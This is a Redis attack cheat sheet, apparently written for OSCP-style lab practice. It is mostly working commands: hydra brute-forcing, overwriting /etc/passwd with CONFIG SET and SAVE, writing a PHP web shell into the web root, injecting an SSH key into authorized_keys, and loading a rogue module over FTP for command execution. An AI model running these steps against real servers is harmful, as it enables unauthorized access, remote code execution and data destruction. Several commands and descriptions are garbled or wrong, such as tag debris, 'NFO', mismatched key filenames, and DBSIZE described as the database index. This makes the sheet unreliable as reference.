```markdown
# File Read/Write Exploitation
The CONFIG SET dir and CONFIG SET dbfilename commands followed by SAVE can be used to write Redis database files to
disk, potentially overwriting critical files (e.g., /etc/passwd) if Redis runs with sufficient privileges. Similarly, setting the dir and dbfilename
to a target file and attempting to load it may allow reading file contents as Redis keys.

## Permissions
These file operations require Redis to have write permissions in the target directory or file. In OSCP labs, check if Redis is
running as root or a privileged user (INFO SERVER can help).

## Unauthenticated Access
Many Redis instances in labs are unauthenticated. If authentication is required, try default credentials (AUTH foobared)
or check for exposed credentials in configuration files.

## Enumeration
Use KEYS *, INFO, and CONFIG GET * to gather information about the Redis instance, such as directories, filenames, or stored data.

## Caution
Be careful with FLUSHDB or FLUSHALL in a lab, as they delete data and could disrupt your progress or other users.

## Extra Tips
-> https://hacktricks.boitatech.com.br/pentesting/6379-pentesting-redis

## nmap
```bash
nmap --script redis-info -sV -p 6379 <IP>
```

## Brute Force Redis Service on port 6379
```bash
hydra [-L users.txt or -l user_name] [-P pass.txt or -p password] -f [-S port] redis://X.X.X.X
hydra -l redis -P <path to wordlist> <target IP> redis
```

## Connect to Redis Service on port 6379
```bash
redis-cli -h 192.168.208.69 -p 6379 #Connect with no username or password
redis-cli -h 192.168.0.0 -p 6379 --user admin --pass password #Connect with username and password
```

## Redis Commands
- **Connect to Redis server (default: localhost, port 6379)**
  ```bash
  redis-cli -h <host> -p <port></port></host>
  ```
- **Authenticate if a password is set**
  ```bash
  AUTH <password></password>
  ```
- **Check if the server is running**
  ```bash
  PING
  ```
- **Get server information**
  ```bash
  INFO SERVER
  INFO CLIENTS
  INFO KEYSPACE
  ```
- **List all keys in the current database**
  ```bash
  KEYS *
  ```
- **Select a specific database (default is 0)**
  ```bash
  SELECT <database_number>
  ```
- **Get the type of a key**
  ```bash
  TYPE <key></key>
  ```
- **Get the value of a key**
  ```bash
  GET <key></key>
  ```
- **Set a key-value pair**
  ```bash
  SET <key> <value></value></key>
  ```
- **Delete a key**
  ```bash
  DEL <key></key>
  ```
- **Check if a key exists**
  ```bash
  EXISTS <key></key>
  ```
- **List all databases**
  ```bash
  CONFIG GET databases
  ```
- **Get the current database index**
  ```bash
  DBSIZE
  ```
- **Flush all keys in the current database**
  ```bash
  FLUSHDB
  ```
- **Flush all keys in all databases**
  ```bash
  FLUSHALL
  ```
- **Get Redis configuration parameters**
  ```bash
  CONFIG GET *
  ```
- **Set a configuration parameter (e.g., dir or dbfilename)**
  ```bash
  CONFIG SET <parameter> <value></value></parameter>
  ```
- **Save the current dataset to disk**
  ```bash
  SAVE
  ```
- **Get the current working directory of the Redis server**
  ```bash
  CONFIG GET dir
  ```
- **Get the database filename**
  ```bash
  CONFIG GET dbfilename
  ```
- **Load a custom module**
  ```bash
  MODULE LOAD /var/ftp/pub/exp.so
  ```

## File Read/Write Operations for Exploitation Redis Commands
- **Connect to Redis server (default: localhost, port 6379)**
  ```bash
  redis-cli -h <host> -p <port></port></host>
  ```
- **Set the directory for the Redis database file**
  ```bash
  CONFIG SET dir /path/to/directory
  ```
- **Set the database filename**
  ```bash
  CONFIG SET dbfilename <filename></filename>
  ```
- **Write the current dataset to a file (potentially overwriting files)**
  ```bash
  SAVE
  ```
- **Example: Overwrite /etc/passwd (if permissions allow)**
  ```bash
  CONFIG SET dir /etc
  CONFIG SET dbfilename passwd
  SAVE
  ```
- **Read a file by loading it as a Redis database file**
  ```bash
  CONFIG SET dir /path/to/target/file
  CONFIG SET dbfilename <target_file>
  KEYS *
  GET <key></key>
  ```
- **Write a string to a file via a key and save**
  ```bash
  SET malicious "<content_to_write>"
  CONFIG SET dir /path/to/destination
  CONFIG SET dbfilename <filename>
  SAVE
  ```
- **Check for loaded modules**
  ```bash
  MODULE LIST
  ```
- **Execute a Lua script (for advanced exploitation)**
  ```bash
  EVAL "<lua_script>" 0
  ```
- **List all connected clients**
  ```bash
  CLIENT LIST
  ```
- **Kill a specific client connection**
  ```bash
  CLIENT KILL addr:port
  ```
- **Set a key with an expiration time (in seconds)**
  ```bash
  SETEX <key> <seconds> <value></value></seconds></key>
  ```
- **Get the time to live for a key (in seconds)**
  ```bash
  TTL <key></key>
  ```
- **Rename a key**
  ```bash
  RENAME <key> <newkey></newkey></key>
  ```
- **Move a key to another database**
  ```bash
  MOVE <key> &#x3C;database_number></key>
  ```
- **Scan for keys incrementally (useful for large datasets)**
  ```bash
  SCAN 0
  ```
- **Get all fields and values of a hash**
  ```bash
  HGETALL <key></key>
  ```
- **Add a value to a list**
  ```bash
  LPUSH <key> <value></value></key>
  ```
- **Retrieve values from a list**
  ```bash
  LRANGE <key> 0 -1
  ```
- **Add a member to a set**
  ```bash
  SADD <key> <member></member></key>
  ```
- **Retrieve all members of a set**
  ```bash
  SMEMBERS <key></key>
  ```
- **Publish a message to a channel**
  ```bash
  PUBLISH <channel> <message></message></channel>
  ```
- **Subscribe to a channel**
  ```bash
  SUBSCRIBE <channel></channel>
  ```
- **Get the length of a string value**
  ```bash
  STRLEN <key></key>
  ```

## If the server appears vulnerable to Redis4.x/5.x RCE but the public exploits don't work, attempt to upload the exp.so file and manually execute it using "MODULE LOAD /var/ftp/filename". Or use a different exp.so exploit module, for example exp_lin.so, which can be found here https://github.com/jas502n/Redis-RCE.
*Requirements Redis access + another way to add files to the target server ie ftp
*Steps below are assuming "ftp access in terminal 1" is used to add a file and "redis-cli terminal 2" to load the module

**ftpTerminal**
```bash
ftp anonymous@target.com
put exp_lin.so
```

**redisTerminal**
```bash
redis-cli -h target.com -p 6379
MODULE LOAD /var/ftp/pub/exp_lin.so
system.exec "id"
```

## Use Metasploit Modules
```bash
use auxiliary/scanner/redis/redis_server
msf auxiliary(scanner/redis/redis_server) > set rhosts X.X.X.X
msf auxiliary(scanner/redis/redis_server) > exploit
use auxiliary/scanner/redis/redis_login
msf auxiliary(scanner/redis/redis_login) > set rhosts X.X.X.X
msf auxiliary(scanner/redis/redis_login) > set user_file /path/to/user.txt
msf auxiliary(scanner/redis/redis_login) > set pass_file /path/to/pass.txt
msf auxiliary(scanner/redis/redis_login) > set stop_on_success true
msf auxiliary(scanner/redis/redis_login) > exploit
```

## Authenticated enumeration
```bash
NFO
[ ... Redis response with info ... ]
client list
[ ... Redis response with connected clients ... ]
CONFIG GET *
[ ... Get config ... ]
```

## Dumping Database
Database(s) should show under keyspace after running info command. database numbers start at 0 which is the default, in example 1 is used.
```bash
SELECT 1
[ ... Indicate the database ... ]
KEYS *
[ ... Get Keys ... ]
GET <KEY>
[ ... Get Key ... ]
```

## Exploiting Redis for Remote Code Execution - V1
```bash
redis-cli -h 192.18.0.0
config set dir /var/www/html
config set dbfilename redis.php
set test "<?php phpinfo(); ?>"
save
```

## Exploiting Redis for Remote Code Execution - V2
```bash
redis-cli -h X.X.X.X flushall
redis-cli -h X.X.X.X set pwn '<?php system($_REQUEST['cmd']); ?>'
redis-cli -h X.X.X.X config set dbfilename shell.php
redis-cli -h X.X.X.X config set dir /var/www/html
redis-cli -h X.X.X.X save
```

## Unauthorized SSH Access via Redis Exploitation - uses Redis to insert SSH public key into the authorized_keys file of a Redis server
```bash
$ ssh-keygen -t ecdsa -s 521 -f key
$ (echo -e "\n\n"; cat key.pub; echo -e "\n\n") > key.txt
$ redis-cli -h X.X.X.X flushall
$ cat foo.txt | redis-cli -h X.X.X.X -x set pwn
$ redis-cli -h X.X.X.X config set dbfilename authorized_keys
$ redis-cli -h X.X.X.X config set dir /var/lib/redis/.ssh
$ redis-cli -h X.X.X.X save
ssh -i id_rsa redis@IP ##Try to login with shh key as redis user
```

## Common Redis Commands
| Command   | Description                                      | Usage                                      |
|-----------|--------------------------------------------------|--------------------------------------------|
| SET       | Sets the value of a key                          | SET key value                              |
| GET       | Gets the value of a key                          | GET key                                    |
| DEL       | Deletes one or more keys                         | DEL key1 [key2 ...]                        |
| KEYS      | Lists all keys matching a pattern                | KEYS pattern                               |
| EXPIRE    | Sets an expiration time on a key                 | EXPIRE key seconds                         |
| TTL       | Gets the remaining TTL of a key                  | TTL key                                    |
| INCR      | Increments the value of a key                    | INCR key                                   |
| DECR      | Decrements the value of a key                    | DECR key                                   |
| LPUSH     | Prepends one or many values to a list            | LPUSH key value [value ...]                |
| RPUSH     | Appends one or many values to a list             | RPUSH key value [value ...]                |
| LPOP      | Removes and gets the first element in a list     | LPOP key                                   |
| RPOP      | Removes and gets the last element in a list      | RPOP key                                   |
| SADD      | Adds one or more members to a set                | SADD key member [member ...]               |
| SMEMBERS  | Gets all members in a set                        | SMEMBERS key                               |
| ZADD      | Adds one or more members to a sorted set         | ZADD key score member [score member ...]   |
| ZRANGE    | Returns a range of members in a sorted set       | ZRANGE key start stop [WITHSCORES]         |
| HSET      | Sets field in the hash stored at key             | HSET key field value [field value ...]     |
| HGET      | Gets the value of a field in a hash stored at key| HGET key field                             |
| HDEL      | Deletes one or more fields from a hash stored at key | HDEL key field [field ...]             |
| HMSET     | Sets multiple fields in a hash stored at key (Use HSET for Redis 4.0.0 and above) | HMSET key field1 value1 [field2 value2 ...] |
```
